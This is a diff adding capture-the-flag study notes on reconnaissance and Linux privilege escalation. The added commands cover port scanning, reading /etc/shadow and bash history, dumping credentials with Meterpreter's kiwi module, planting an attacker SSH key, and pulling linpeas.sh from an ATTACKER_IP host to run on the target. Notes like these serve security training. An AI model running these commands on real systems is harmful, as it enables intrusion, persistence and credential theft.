@@ -57,3 +57,98 @@ sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=FORMAT HASH_FILE
 
 john --list=formats | grep -i md5
 ```
+
+## Resources
+
+- [spawning a TTY shell in many languages](https://netsec.ws/?p=337)
+- [unix binaries to bypass security](https://gtfobins.github.io/#+sudo)
+- [file endings in linux](https://lauraliparulo.altervista.org/most-common-linux-file-extensions/)
+
+## Recon + Privilege Escalation
+
+In CTFs there is rarely any negative consequence, so going into full offensive is fine.
+
+### external
+
+- open/filtered ports
+- services on ports
+- find HTTP endpoints
+
+```bash
+# portscan + service detection
+nmap -A -sV -p- $IP
+# alternative with Metasploit
+msfdb init
+msfconsole
+db_nmap -A -sv -p- $IP
+
+# HTTP endpoints
+curl $IP/robots.txt
+feroxbuster -u http://10.10.80.188 --no-recursion -vv --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+```
+
+### internal
+
+i.e. after getting a shell on the target
+
+- stabilize shell
+  - `whoami`
+  - add attacker's ssh key to `authorized_keys`
+- system infos
+- current sudo privileges
+- services + processes
+- service + package versions
+- usernames + credentials
+
+What we're looking for:
+
+- root access
+- credentials
+- further vulnerabilities (with the ultimate goal of root access)
+
+```bash
+# system infos
+hostnamectl
+# alternative:
+uname -a
+
+# own permissions
+sudo --list
+
+# services + processes
+less ~/.bash_history # also bashprofile, bashrc, bash_aliases
+ps -ef
+
+# versions
+sudo -V
+apt list --installed
+
+# usernames + credentials
+less /etc/passwd
+less /etc/shadow
+# with metasploit meterpreter
+load kiwi
+creds_all
+
+# check for known vulnerabilities
+searchsploit <systeminfo / services>
+
+# backups, configs, logs
+find / -type f -name '*.log' 2>/dev/null
+find / -type f -name '*.bak' 2>/dev/null
+find / -type f -name '*.conf' 2>/dev/null
+# if everything fails to find the flag, search all file contents
+find / -type f -exec cat {} \; | grep -E 'thm{'
+
+# swiss-army knife
+# on attacker machine
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+python3 -m http.server 8000
+# on target machine
+wget ${ATTACKER_IP}:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+## swiss-army knife 2 - LinEnum.sh
+# analog to linpeas.sh
+```
